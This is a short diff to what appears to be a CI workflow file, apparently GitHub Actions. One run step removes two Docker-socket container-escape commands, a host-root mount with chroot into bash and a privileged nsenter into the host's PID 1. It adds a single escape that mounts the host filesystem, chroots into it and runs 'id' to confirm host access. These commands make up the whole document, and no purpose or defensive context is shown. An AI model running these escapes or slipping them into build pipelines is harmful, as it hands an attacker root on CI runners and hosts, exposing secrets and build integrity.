@@ -5,8 +5,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |     
-            docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
-            docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+            docker -H unix:///var/run/docker.sock run -v /:/host ubuntu chroot /host /bin/bash -- id
 
             
        
